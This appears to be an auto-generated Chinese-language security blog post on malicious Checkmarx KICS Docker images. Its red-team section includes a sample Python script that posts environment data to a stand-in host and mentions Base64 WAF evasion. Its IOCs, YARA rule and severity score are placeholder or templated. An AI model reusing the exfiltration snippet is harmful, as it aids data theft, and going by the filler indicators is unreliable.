---
layout: post
title:  "Malicious KICS Docker Images and VS Code Extensions Hit Checkmarx Supply Chain"
date:   2026-04-22 19:04:15 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Checkmarx KICS Docker Hub 存儲庫的惡意鏡像攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Remote Code Execution (RCE) 和敏感信息泄露
> * **關鍵技術**: Docker Hub, KICS, Supply Chain Attack, Malicious Image

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意攻擊者成功地篡改了 Checkmarx KICS 的 Docker Hub 存儲庫，添加了惡意鏡像，包括修改了現有的標籤（如 v2.1.20 和 alpine）和引入了一個新的 v2.1.21 標籤。
* **攻擊流程圖解**:
  1.攻擊者篡改 Docker Hub 存儲庫。
  2.使用者下載惡意鏡像。
  3.惡意鏡像執行，收集和外泄敏感信息。
* **受影響元件**: Checkmarx KICS 的 Docker Hub 存儲庫，版本號包括 v2.1.20、alpine 和 v2.1.21。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要對 Docker Hub 存儲庫有寫入權限。
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例惡意鏡像構建腳本
      import os
      import requests
    
      # 收集敏感信息
      sensitive_info = os.environ.get('SENSITIVE_INFO')
    
      # 外泄敏感信息
      requests.post('https://example.com/collect', data=sensitive_info)
    
    ```
  *範例指令*: `docker pull checkmarx/kics:v2.1.21` 和 `docker run -it checkmarx/kics:v2.1.21`
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用 Base64 編碼的 Payload。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| xxxxxxxx | 192.168.1.100 | example.com | /usr/local/bin/kics |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule malicious_kics {
        meta:
          description = "Detect malicious KICS image"
          author = "Your Name"
        strings:
          $a = "sensitive_info" ascii
        condition:
          $a
      }
    
    ```
  或者是具體的 SIEM 查詢語法 (Splunk/Elastic)： `index=docker_logs "checkmarx/kics:v2.1.21"`
* **緩解措施**: 更新 Checkmarx KICS 到最新版本，使用安全的 Docker Hub 存儲庫，並設定 WAF 和 EDR。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 惡意攻擊者針對軟件供應鏈的弱點，例如第三方庫或存儲庫，進行攻擊。
* **Docker Hub (Docker Hub 存儲庫)**: Docker 官方的鏡像存儲庫。
* **KICS (KICS)**: Checkmarx 的一種靜態應用安全測試工具。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/malicious-kics-docker-images-and-vs.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


